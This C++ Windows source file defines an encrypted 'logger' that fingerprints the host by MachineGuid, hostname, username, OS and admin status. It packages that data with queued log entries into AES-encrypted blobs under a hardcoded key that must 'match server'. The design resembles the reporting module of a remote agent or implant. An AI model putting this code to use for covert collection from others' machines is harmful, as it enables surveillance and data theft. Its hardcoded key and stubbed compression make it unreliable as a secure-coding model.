#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>
#include <chrono>
#include <random>
#include <memory>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")

class EncryptedLogger {
private:
    // AES-256 key (must match server)
    static constexpr char AES_KEY[] = "d252cf8eb2cca12d1e731ed3e362504e";
    static constexpr size_t AES_KEY_SIZE = 32;
    static constexpr size_t AES_BLOCK_SIZE = 16;
    
    struct LogPackage {
        std::string agent_id;
        std::string timestamp;
        std::string data_type;
        std::vector<uint8_t> content;
        std::string checksum;
    };
    
    std::vector<LogPackage> pending_logs;
    std::string agent_id;
    
    // Crypto handles
    BCRYPT_ALG_HANDLE hAlg;
    BCRYPT_KEY_HANDLE hKey;
    
public:
    EncryptedLogger() : hAlg(NULL), hKey(NULL) {
        InitializeCrypto();
        GenerateAgentId();
    }
    
    ~EncryptedLogger() {
        // Securely clear all sensitive data
        for (auto& log : pending_logs) {
            if (!log.content.empty()) {
                SecureZeroMemory(log.content.data(), log.content.size());
            }
            // Clear strings by overwriting
            log.agent_id.assign(log.agent_id.size(), '\0');
            log.checksum.assign(log.checksum.size(), '\0');
            log.data_type.assign(log.data_type.size(), '\0');
            log.timestamp.assign(log.timestamp.size(), '\0');
        }
        pending_logs.clear();
        
        // Clear agent ID
        agent_id.assign(agent_id.size(), '\0');
        
        CleanupCrypto();
    }
    
    // Add log entry
    void AddLog(const std::string& data_type, const std::vector<uint8_t>& data) {
        LogPackage package;
        package.agent_id = agent_id;
        package.timestamp = GetCurrentTimestamp();
        package.data_type = data_type;
        package.content = data;
        package.checksum = CalculateChecksum(data);
        
        pending_logs.push_back(package);
    }
    
    // Add JSON log
    void AddJsonLog(const std::string& data_type, const std::string& json_data) {
        std::vector<uint8_t> data(json_data.begin(), json_data.end());
        AddLog(data_type, data);
    }
    
    // Encrypt all pending logs
    std::vector<uint8_t> EncryptLogs() {
        if (pending_logs.empty()) {
            return std::vector<uint8_t>();
        }
        
        // Create JSON package
        std::string json = CreateJsonPackage();
        
        // Compress
        std::vector<uint8_t> compressed = CompressData(
            std::vector<uint8_t>(json.begin(), json.end())
        );
        
        // Encrypt
        std::vector<uint8_t> encrypted = EncryptData(compressed);
        
        // Clear pending logs after encryption
        pending_logs.clear();
        
        return encrypted;
    }
    
    // Get system information
    std::string GetSystemInfo() {
        std::stringstream ss;
        ss << "{";
        
        // Hostname
        char hostname[256];
        DWORD size = sizeof(hostname);
        if (GetComputerNameA(hostname, &size)) {
            ss << "\"hostname\":\"" << EscapeJson(hostname) << "\",";
        }
        
        // Username
        char username[256];
        size = sizeof(username);
        if (GetUserNameA(username, &size)) {
            ss << "\"username\":\"" << EscapeJson(username) << "\",";
        }
        
        // OS Version
        OSVERSIONINFOEXA osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
        
        if (GetVersionExA((OSVERSIONINFOA*)&osvi)) {
            ss << "\"os\":\"Windows " << osvi.dwMajorVersion << "." 
               << osvi.dwMinorVersion << " Build " << osvi.dwBuildNumber << "\",";
        }
        
        // Architecture
        SYSTEM_INFO si;
        ::GetSystemInfo(&si);
        ss << "\"architecture\":\"" 
           << (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86") 
           << "\",";
        
        // Privileges
        ss << "\"privileges\":\"" << (IsUserAdmin() ? "admin" : "user") << "\",";
        
        // Remove last comma and close
        std::string result = ss.str();
        if (result.back() == ',') result.pop_back();
        result += "}";
        
        return result;
    }
    
    // Get agent ID
    std::string GetAgentId() const {
        return agent_id;
    }
    
private:
    void InitializeCrypto() {
        try {
            // Open AES algorithm provider with validation
            NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
            if (status != 0) {
                throw std::runtime_error("Failed to open AES algorithm provider, status: 0x" + std::to_string(status));
            }
            
            // Set CBC mode with validation
            status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, 
                                     (PUCHAR)BCRYPT_CHAIN_MODE_CBC, 
                                     sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
            if (status != 0) {
                BCryptCloseAlgorithmProvider(hAlg, 0);
                hAlg = NULL;
                throw std::runtime_error("Failed to set CBC mode, status: 0x" + std::to_string(status));
            }
            
            // Generate key from string with validation
            std::vector<uint8_t> key_bytes(AES_KEY, AES_KEY + AES_KEY_SIZE);
            status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                              key_bytes.data(), AES_KEY_SIZE, 0);
            if (status != 0) {
                BCryptCloseAlgorithmProvider(hAlg, 0);
                hAlg = NULL;
                throw std::runtime_error("Failed to generate symmetric key, status: 0x" + std::to_string(status));
            }
            
            // Securely clear key bytes from memory
            SecureZeroMemory(key_bytes.data(), key_bytes.size());
            
        } catch (const std::exception& e) {
            // Log error and set handles to NULL
            hAlg = NULL;
            hKey = NULL;
            // In a real implementation, you'd want proper error logging here
        }
    }
    
    void CleanupCrypto() {
        try {
            if (hKey) {
                BCryptDestroyKey(hKey);
                hKey = NULL;
            }
            if (hAlg) {
                BCryptCloseAlgorithmProvider(hAlg, 0);
                hAlg = NULL;
            }
        } catch (...) {
            // Ensure handles are nullified even if cleanup fails
            hKey = NULL;
            hAlg = NULL;
        }
    }
    
    void GenerateAgentId() {
        // Get machine GUID
        HKEY hKey;
        char machineGuid[64] = {0};
        DWORD size = sizeof(machineGuid);
        
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                         "SOFTWARE\\Microsoft\\Cryptography", 
                         0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
            RegQueryValueExA(hKey, "MachineGuid", NULL, NULL, 
                           (LPBYTE)machineGuid, &size);
            RegCloseKey(hKey);
        }
        
        // Hash machine GUID to create agent ID
        agent_id = CalculateHash(std::string(machineGuid));
    }
    
    std::string CreateJsonPackage() {
        std::stringstream ss;
        ss << "{";
        ss << "\"agent_id\":\"" << agent_id << "\",";
        ss << "\"timestamp\":\"" << GetCurrentTimestamp() << "\",";
        ss << "\"version\":\"1.0.0\",";
        ss << "\"system_info\":" << GetSystemInfo() << ",";
        ss << "\"logs\":[";
        
        for (size_t i = 0; i < pending_logs.size(); i++) {
            const auto& log = pending_logs[i];
            ss << "{";
            ss << "\"timestamp\":\"" << log.timestamp << "\",";
            ss << "\"data_type\":\"" << log.data_type << "\",";
            ss << "\"content\":\"" << Base64Encode(log.content) << "\",";
            ss << "\"checksum\":\"" << log.checksum << "\"";
            ss << "}";
            
            if (i < pending_logs.size() - 1) ss << ",";
        }
        
        ss << "]}";
        return ss.str();
    }
    
    std::vector<uint8_t> CompressData(const std::vector<uint8_t>& data) {
        // Simple RLE compression for demo
        // In production, use zlib or similar
        std::vector<uint8_t> compressed;
        compressed.reserve(data.size());
        
        // Add uncompressed for now (implement proper compression)
        compressed = data;
        
        return compressed;
    }
    
    std::vector<uint8_t> EncryptData(const std::vector<uint8_t>& data) {
        try {
            // Validate crypto handles
            if (!hKey || !hAlg) {
                throw std::runtime_error("Crypto not properly initialized");
            }
            
            // Validate input data
            if (data.empty() || data.size() > 100 * 1024 * 1024) { // 100MB max
                throw std::runtime_error("Invalid data size for encryption");
            }
            
            // Generate random IV with validation
            std::vector<uint8_t> iv(AES_BLOCK_SIZE);
            NTSTATUS status = BCryptGenRandom(NULL, iv.data(), AES_BLOCK_SIZE, 
                                           BCRYPT_USE_SYSTEM_PREFERRED_RNG);
            if (status != 0) {
                throw std::runtime_error("Failed to generate random IV, status: 0x" + std::to_string(status));
            }
            
            // Pad data to block size with PKCS7 padding
            std::vector<uint8_t> padded_data = data;
            size_t padding = AES_BLOCK_SIZE - (data.size() % AES_BLOCK_SIZE);
            if (padding == 0) padding = AES_BLOCK_SIZE; // Always add padding
            padded_data.insert(padded_data.end(), padding, (uint8_t)padding);
            
            // Encrypt with validation
            std::vector<uint8_t> encrypted(padded_data.size());
            ULONG cbResult = 0;
            
            status = BCryptEncrypt(hKey, padded_data.data(), (ULONG)padded_data.size(),
                                 NULL, iv.data(), AES_BLOCK_SIZE,
                                 encrypted.data(), (ULONG)encrypted.size(),
                                 &cbResult, 0);
            
            if (status != 0) {
                // Securely clear sensitive data before throwing
                SecureZeroMemory(padded_data.data(), padded_data.size());
                SecureZeroMemory(iv.data(), iv.size());
                throw std::runtime_error("Encryption failed, status: 0x" + std::to_string(status));
            }
            
            // Validate encryption result
            if (cbResult != encrypted.size()) {
                SecureZeroMemory(padded_data.data(), padded_data.size());
                SecureZeroMemory(iv.data(), iv.size());
                throw std::runtime_error("Encryption size mismatch");
            }
            
            // Prepend IV to encrypted data
            std::vector<uint8_t> result;
            result.reserve(iv.size() + encrypted.size());
            result.insert(result.end(), iv.begin(), iv.end());
            result.insert(result.end(), encrypted.begin(), encrypted.end());
            
            // Securely clear sensitive temporary data
            SecureZeroMemory(padded_data.data(), padded_data.size());
            SecureZeroMemory(iv.data(), iv.size());
            SecureZeroMemory(encrypted.data(), encrypted.size());
            
            return result;
            
        } catch (const std::exception& e) {
            // Return empty vector on any error
            return std::vector<uint8_t>();
        }
    }
    
    std::string Base64Encode(const std::vector<uint8_t>& data) {
        try {
            // Validate input
            if (data.empty() || data.size() > 50 * 1024 * 1024) { // 50MB max
                return "";
            }
            
            // Get required size
            DWORD size = 0;
            if (!CryptBinaryToStringA(data.data(), (DWORD)data.size(),
                                    CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                                    NULL, &size)) {
                return "";
            }
            
            if (size == 0 || size > 100 * 1024 * 1024) { // 100MB max output
                return "";
            }
            
            // Perform encoding
            std::string result(size, 0);
            if (!CryptBinaryToStringA(data.data(), (DWORD)data.size(),
                                    CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                                    &result[0], &size)) {
                return "";
            }
            
            // Remove null terminator
            if (!result.empty() && result.back() == '\0') {
                result.pop_back();
            }
            
            return result;
            
        } catch (...) {
            return "";
        }
    }
    
    std::string CalculateChecksum(const std::vector<uint8_t>& data) {
        HCRYPTPROV hProv = 0;
        HCRYPTHASH hHash = 0;
        std::string result;
        
        try {
            // Validate input
            if (data.empty() || data.size() > 500 * 1024 * 1024) { // 500MB max
                return "";
            }
            
            // Acquire crypto context
            if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
                DWORD error = GetLastError();
                return "";
            }
            
            // Create hash object
            if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
                DWORD error = GetLastError();
                CryptReleaseContext(hProv, 0);
                return "";
            }
            
            // Hash data
            if (!CryptHashData(hHash, data.data(), (DWORD)data.size(), 0)) {
                DWORD error = GetLastError();
                CryptDestroyHash(hHash);
                CryptReleaseContext(hProv, 0);
                return "";
            }
            
            // Get hash value
            DWORD hashSize = 32;
            std::vector<uint8_t> hash(hashSize);
            if (!CryptGetHashParam(hHash, HP_HASHVAL, hash.data(), &hashSize, 0)) {
                DWORD error = GetLastError();
                CryptDestroyHash(hHash);
                CryptReleaseContext(hProv, 0);
                return "";
            }
            
            // Validate hash size
            if (hashSize != 32) {
                CryptDestroyHash(hHash);
                CryptReleaseContext(hProv, 0);
                return "";
            }
            
            // Convert to hex string
            std::stringstream ss;
            for (auto byte : hash) {
                ss << std::hex << std::setw(2) << std::setfill('0') << (int)byte;
            }
            result = ss.str();
            
            // Securely clear hash from memory
            SecureZeroMemory(hash.data(), hash.size());
            
            // Cleanup
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);
            
        } catch (...) {
            // Cleanup on exception
            if (hHash) CryptDestroyHash(hHash);
            if (hProv) CryptReleaseContext(hProv, 0);
            result = "";
        }
        
        return result;
    }
    
    std::string CalculateHash(const std::string& input) {
        std::vector<uint8_t> data(input.begin(), input.end());
        return CalculateChecksum(data).substr(0, 16); // Use first 16 chars
    }
    
    std::string GetCurrentTimestamp() {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        
        struct tm timeinfo;
        gmtime_s(&timeinfo, &time_t);
        
        char buffer[32];
        strftime(buffer, sizeof(buffer), "%Y-%m-%dT%H:%M:%SZ", &timeinfo);
        
        return std::string(buffer);
    }
    
    std::string EscapeJson(const std::string& str) {
        std::string result;
        for (char c : str) {
            switch (c) {
                case '"': result += "\\\""; break;
                case '\\': result += "\\\\"; break;
                case '\b': result += "\\b"; break;
                case '\f': result += "\\f"; break;
                case '\n': result += "\\n"; break;
                case '\r': result += "\\r"; break;
                case '\t': result += "\\t"; break;
                default:
                    if (c >= 0x20 && c <= 0x7E) {
                        result += c;
                    } else {
                        char buf[7];
                        snprintf(buf, sizeof(buf), "\\u%04x", (unsigned char)c);
                        result += buf;
                    }
            }
        }
        return result;
    }
    
    bool IsUserAdmin() {
        BOOL isAdmin = FALSE;
        PSID adminGroup = NULL;
        
        SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
        if (AllocateAndInitializeSid(&ntAuthority, 2,
                                   SECURITY_BUILTIN_DOMAIN_RID,
                                   DOMAIN_ALIAS_RID_ADMINS,
                                   0, 0, 0, 0, 0, 0, &adminGroup)) {
            CheckTokenMembership(NULL, adminGroup, &isAdmin);
            FreeSid(adminGroup);
        }
        
        return isAdmin == TRUE;
    }
};

// Global encrypted logger
std::unique_ptr<EncryptedLogger> g_encryptedLogger;

// Export functions
extern "C" {
    void InitEncryptedLogger() {
        if (!g_encryptedLogger) {
            g_encryptedLogger = std::make_unique<EncryptedLogger>();
        }
    }
    
    void AddEncryptedLog(const char* dataType, const char* jsonData) {
        if (g_encryptedLogger) {
            g_encryptedLogger->AddJsonLog(dataType, jsonData);
        }
    }
    
    const char* GetAgentId() {
        static std::string agentId;
        if (g_encryptedLogger) {
            agentId = g_encryptedLogger->GetAgentId();
            return agentId.c_str();
        }
        return "";
    }
    
    // Global wrapper function for EncryptLogs
    std::vector<uint8_t> EncryptLogs() {
        if (g_encryptedLogger) {
            return g_encryptedLogger->EncryptLogs();
        }
        return std::vector<uint8_t>();
    }
}